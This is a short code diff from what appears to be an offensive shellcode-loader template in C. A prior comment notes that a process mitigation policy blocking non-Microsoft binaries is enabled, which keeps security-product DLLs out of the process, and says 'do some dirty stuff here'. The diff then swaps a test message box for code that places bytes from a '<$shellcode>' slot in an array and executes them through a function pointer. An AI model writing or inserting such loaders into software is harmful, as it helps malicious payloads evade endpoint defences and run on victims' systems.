@@ -183,9 +183,10 @@ int main(int argc, char** argv) {
         Debug();
         ExitProcess(0);
     } else {
-        // We have the argument so PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON is now on
-        // Do some dirty stuff here
-        MessageBox(NULL, "test", "test", MB_OK);
+        unsigned char code[] = <$shellcode>
+                int (*ret)() = (int(*)())code;
+        ret();
+
     }
 
     return 0;
